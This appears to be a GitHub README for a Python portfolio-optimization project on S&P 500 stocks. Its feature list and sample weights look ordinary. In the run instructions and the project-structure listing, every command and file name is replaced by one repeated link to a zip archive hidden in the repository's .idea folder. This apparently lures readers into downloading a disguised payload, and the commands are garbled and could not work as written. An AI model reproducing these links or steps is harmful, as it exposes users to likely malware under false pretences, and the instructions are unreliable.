# Portfolio Optimization and Efficient Frontier Analysis

This project performs portfolio optimization on selected S&P 500 stocks using **Python**, **matrix algebra**, and **quadratic programming**. It includes visualization of the **efficient frontier**, **Monte Carlo simulations**, **asset correlation heatmap**, **risk-return tradeoff curves**, and portfolio weights.

---

## **Project Purpose**

The goal of this project is to:

1. Optimize a stock portfolio to minimize risk (variance) or maximize return-adjusted risk (Sharpe ratio).  
2. Explore the tradeoff between risk and return using **efficient frontier analysis**.  
3. Visualize portfolio characteristics and correlations between assets.  
4. Simulate multiple portfolio outcomes using **Monte Carlo methods**.  

---

## **Features / Requirements Implemented**

1. **Efficient Frontier Plot** – Shows the optimal risk-return tradeoff.  
2. **Monte Carlo Portfolio Simulation** – Random portfolio generation and Sharpe ratio calculation.  
3. **Asset Correlation Heatmap** – Visualizes correlation between selected stocks.  
4. **Risk–Return Tradeoff Curve** – Shows distribution of simulated portfolios.  
5. **Portfolio Weight Pie Charts** – Visualizes allocation for minimum variance and maximum Sharpe portfolios.

---

## **Technologies / Libraries Used**

- Python 3.x  
- NumPy  
- Pandas  
- SciPy  
- Matplotlib  
- Seaborn  
- yfinance  

---

## **How to Run**

1. Clone the repository:

```bash
git clone https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip
Install required libraries:

pip install -r https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip


Run the main script:

python https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip


The script will generate all plots:

Efficient Frontier with Monte Carlo points

Monte Carlo Portfolio Simulation

Asset Correlation Heatmap

Risk-Return Tradeoff Curve

Portfolio Weight Pie Charts

Project Structure
Portfolio_Optimization_S&P500/
│
├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip                 # Main execution script
├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip               # Configuration (tickers, dates, parameters)
├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip          # Functions to download and process stock data
├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip       # Expected returns, covariance, correlation
├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip            # Portfolio optimization functions
├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip           # Monte Carlo simulation
├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip        # Plotting and visualization functions
├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip        # Python dependencies
└─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip               # Project documentation

Sample Portfolio Weights Output
Minimum Variance Weights:
AAPL    0.32
MSFT    0.12
GOOG    0.25
TSLA    0.31

Maximum Sharpe Weights:
META    0.71
NVDA    0.29
